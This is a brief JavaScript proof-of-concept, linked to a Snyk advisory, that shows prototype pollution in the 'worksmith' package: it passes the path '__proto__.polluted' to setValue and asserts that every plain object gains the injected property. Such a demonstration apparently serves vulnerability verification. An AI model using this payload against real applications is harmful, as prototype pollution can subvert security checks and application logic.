//https://snyk.io/vuln/SNYK-JS-WORKSMITH-598798

const worksmith = require('worksmith'); 
const { assert } = require("@firebase/util");

var obj = {}
console.log("Before : " + obj.polluted);
worksmith.setValue({}, '__proto__.polluted',"yes"); 

console.log("After : " + obj.polluted);
assert({}.polluted === "yes");
console.log("payload success!");